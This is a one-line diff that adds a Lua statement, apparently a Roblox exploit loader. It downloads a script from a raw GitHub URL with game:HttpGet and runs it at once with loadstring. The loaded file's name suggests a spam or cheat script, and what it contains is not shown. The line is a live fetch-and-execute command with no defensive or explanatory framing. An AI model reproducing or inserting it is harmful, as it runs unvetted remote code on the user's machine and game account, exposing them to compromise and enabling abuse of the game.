@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/electricity-bricklayer-spam3-pu7z0xl0dx12e2.lua"))()
